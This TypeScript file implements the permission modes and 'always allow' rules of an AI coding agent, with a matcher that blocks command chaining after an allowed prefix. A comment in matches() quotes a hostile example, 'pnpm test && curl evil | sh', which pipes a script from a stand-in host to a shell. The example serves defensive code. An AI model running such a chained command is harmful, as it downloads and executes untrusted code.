/**
 * Permission engine — the 4 play modes.
 *
 * Reading    : the agent reads and replies, no writes and no commands.
 * Rehearsal  : anything that touches the system asks for agreement (default).
 * Quill      : the agent holds the pen — automatic edits, but no commands.
 * Improv     : anything goes.
 *
 * The mode is a CEILING: a remembered rule can turn an "ask" into an
 * "allow", but it can never lift a denial coming from the mode.
 */

import type { ToolEffect } from '../tools/types.js';

export type PlayMode = 'lecture' | 'repetition' | 'plume' | 'impro';

export const PLAY_MODES: readonly PlayMode[] = [
  'lecture',
  'repetition',
  'plume',
  'impro',
];

export type PermissionDecision = 'allow' | 'ask' | 'deny';

/** Remembered rule for a project ("always allow this"). */
export interface AllowRule {
  tool: string;
  /** For execution tools: allowed command prefix (a program name — its commands, never a second one). */
  commandPrefix?: string;
  /** For execution tools: this exact command line, nothing more (surrounding spaces aside). */
  exactCommand?: string;
}

/** What an "always allow" covers: this very command, or every command of its program. */
export type AlwaysScope = 'command' | 'binary';

/**
 * The program a command runs, when it is a plain name that can safely
 * become a prefix rule — `git`, `pnpm`, `npx`. An environment assignment,
 * a substitution or any shell operator in the first word: undefined.
 */
export function commandBinary(command: string): string | undefined {
  const first = command.trim().split(/\s+/)[0] ?? '';
  // A name or a forward-slash path; a Windows path falls back to the exact line.
  return /^\w[\w.\-/:]*$/.test(first) ? first : undefined;
}

/**
 * The rule an "always allow" remembers (Q-24, audit C1): the exact line
 * for "this command", the program for "every command of it" — and the
 * exact line again when the program is not a plain name. A tool with no
 * command is allowed as a whole.
 */
export function alwaysRule(tool: string, command: string | undefined, scope: AlwaysScope): AllowRule {
  if (command === undefined) return { tool };
  const binary = scope === 'binary' ? commandBinary(command) : undefined;
  return binary ? { tool, commandPrefix: binary } : { tool, exactCommand: command.trim() };
}

export interface PermissionQuery {
  tool: string;
  effect: ToolEffect;
  /** Full command, for execution tools. */
  command?: string;
}

export class PermissionEngine {
  /**
   * `rules`: a fixed list, or a provider read on every evaluation — the
   * host answers with the grants of the project whose turn is running.
   * `remember`/`forget` edit a fixed list only.
   */
  constructor(
    private mode: PlayMode = 'repetition',
    private rules: AllowRule[] | (() => AllowRule[]) = [],
  ) {}

  private currentRules(): AllowRule[] {
    return typeof this.rules === 'function' ? this.rules() : this.rules;
  }

  getMode(): PlayMode {
    return this.mode;
  }

  setMode(mode: PlayMode): void {
    this.mode = mode;
  }

  listRules(): AllowRule[] {
    return this.currentRules().map((rule) => ({ ...rule }));
  }

  remember(rule: AllowRule): void {
    const rules = this.currentRules();
    if (typeof this.rules === 'function') throw new Error('Rules come from a provider: remember them there.');
    if (!rules.some((existing) => sameRule(existing, rule))) {
      this.rules = [...rules, { ...rule }];
    }
  }

  forget(rule: AllowRule): void {
    if (typeof this.rules === 'function') throw new Error('Rules come from a provider: forget them there.');
    this.rules = this.rules.filter((existing) => !sameRule(existing, rule));
  }

  evaluate(query: PermissionQuery): PermissionDecision {
    const ceiling = MODE_MATRIX[this.mode][query.effect];
    // The mode is a ceiling: a rule can only loosen an "ask".
    if (ceiling !== 'ask') return ceiling;
    return this.currentRules().some((rule) => matches(rule, query)) ? 'allow' : 'ask';
  }
}

const MODE_MATRIX: Record<PlayMode, Record<ToolEffect, PermissionDecision>> = {
  lecture: { read: 'allow', write: 'deny', execute: 'deny' },
  repetition: { read: 'allow', write: 'ask', execute: 'ask' },
  plume: { read: 'allow', write: 'allow', execute: 'ask' },
  impro: { read: 'allow', write: 'allow', execute: 'allow' },
};

function sameRule(a: AllowRule, b: AllowRule): boolean {
  return a.tool === b.tool && a.commandPrefix === b.commandPrefix && a.exactCommand === b.exactCommand;
}

function matches(rule: AllowRule, query: PermissionQuery): boolean {
  if (rule.tool !== query.tool) return false;
  if (rule.exactCommand !== undefined) return (query.command ?? '').trim() === rule.exactCommand;
  if (rule.commandPrefix === undefined) return true;
  const command = query.command ?? '';
  if (!command.startsWith(rule.commandPrefix)) return false;
  // Word boundary: "pnpm test" must not authorize "pnpm testament".
  const next = command.charAt(rule.commandPrefix.length);
  if (next !== '' && !/\s/.test(next)) return false;
  // A shell operator after the prefix starts ANOTHER command: "pnpm test &&
  // curl evil | sh" begins with the prefix and has a space next, and every
  // operator behind a space was authorised (audit, 2026-08-28). The rule
  // covers arguments, never a second command, a pipe, a redirection or a
  // substitution.
  return !SHELL_OPERATOR.test(command.slice(rule.commandPrefix.length));
}

/** What turns "the same command with arguments" into something else: ; & | < > $ ` and a line break. */
const SHELL_OPERATOR = /[;&|<>$`\n]/;
